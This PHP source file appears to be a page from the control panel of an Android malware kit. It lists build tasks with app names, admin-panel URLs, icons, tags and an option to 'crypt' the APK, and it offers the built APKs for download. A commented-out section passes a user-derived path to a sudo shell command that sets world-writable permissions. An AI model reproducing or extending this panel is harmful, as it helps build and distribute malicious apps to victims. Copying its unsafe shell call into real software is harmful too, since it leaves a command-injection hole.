<?php
chdir("../tasks");

$files = scandir(".", 1);

$tasks = array();
$apks = array();

foreach($files as $file)
{
	if(substr($file, -5) == ".json")
		$tasks[] = $file;

	if(substr($file, -4) == ".apk")
		$apks[] = $file;
}




?>

<center><h3 style="color: white">Waiting Tasks</h3> </center>
<div class="content" style="padding-top:15px;">
 <table class="table table-hover table_dark" id="bootstrap-table">
 <thead class="header_table_bots">
		<th><a style='color: #EDB749;'>File Name</a></th>
		<th><a title="Delete"><img src="images/icons/table/icloud.png" width='25px'/></a></th>
</thead>

<?php
asort($tasks);
foreach($tasks as $task)
{

	$data = json_decode(file_get_contents($task), true);
	$name = $data['appname'];
	$admin_url = $data['admin_url'];
	$icon_name = $data['icon_name'];
	$tag = $data['tag'];
	$status = $data['status'];
	$crypt = ($data['cryptapk'] == 1)? "yes" : "no";
	
	$delete = " / <a href='application/set/deleteFile.php?t=apk&f=$task' style='text-decoration: underline' onclick='return confirm(\"Delete Task?\")'>Delete</a>";

	if($status == "Building")
	{
		$status = "<span style='color: orange'>$status</span>";
		$delete = "";
	}
	
	if($status == "Error")
	{
		$status = "<span style='color: red'>$status</span>";
	}
	
	echo "<tr class='table_bots' style='color: #A4A4A4; font-size: 15pt'>
	<td style='text-align: left'>Name: <a>{$name}</a><br />
	URL admin panel: <a>{$admin_url}</a><br />
	Icon: <a>{$icon_name}</a><br />
	Tag: <a>{$tag}</a><br />
	With crypt: <a>{$crypt}</a>
	</td>
	<td>Status: <a>{$status}</a>
	{$delete}
	</td>
</tr>";
}

?>

</table>
</div>


<center><h3 style="color: white">APKS</h3> </center>
<div class="content" style="padding-top:15px;">
 <table class="table table-hover table_dark" id="bootstrap-table">
 <thead class="header_table_bots">
		<th><a style='color: #EDB749;'>File Name</a></th>
		<th><a title="Delete"><img src="images/icons/table/icloud.png" width='25px'/></a></th>
</thead>
<?php

if(sizeof($apks))
foreach($apks as $nameF)
{
echo "<tr class='table_bots' style='color: #A4A4A4; font-size: 15pt'>
	<td><a href='application/set/downloadFile.php?t=apk&f=$nameF' style='text-decoration: underline' title='$nameF'>$nameF</a></td>
	<td><a href='application/set/downloadFile.php?t=apk&f=$nameF' style='text-decoration: underline'>Download</a> / <a href='application/set/deleteFile.php?t=apk&f=$nameF' 
	style='text-decoration: underline' onclick='return confirm(\"Delete File?\")'>Delete</a></td>
</tr>";
}

?>


</table>
</div>



<!--
$user =$_SESSION['panel_user'];
$svoy=getcwd();
$godir="application/datalogs/files/filesapk/$user";

$dir = "$svoy/$godir";
$files2 = scandir($dir, 1);

if(!file_exists("$godir")){
	system("sudo mkdir $godir && sudo chmod 777 $godir && touch $godir/fhkjadgjghkshkliy-.txt");
}

echo "<p id='text_command' style='margin-top:5px; Color:#EDB749;  font-size: 13pt;'>APK files</p>";

foreach($files2 as $fil)
{
	if ((!preg_match("/fhkjadgjghkshkliy-.txt/",$fil))&&($fil!=".")&&($fil!=".."))
	{
		$nameF = $fil;
		$path = "application/datalogs/files/filesapk/$user/";

		echo "<tr class='table_bots' style='color: #A4A4A4'>

				<td><a title='$nameF'>$nameF</a></td>
				<td><a href='$path$fil' download>Download</a> / <a href='application/set/deleteFile.php?t=apk&f=$nameF'>Delete</a></td>
				</tr>";
	 }
}
?>
</div>
-->
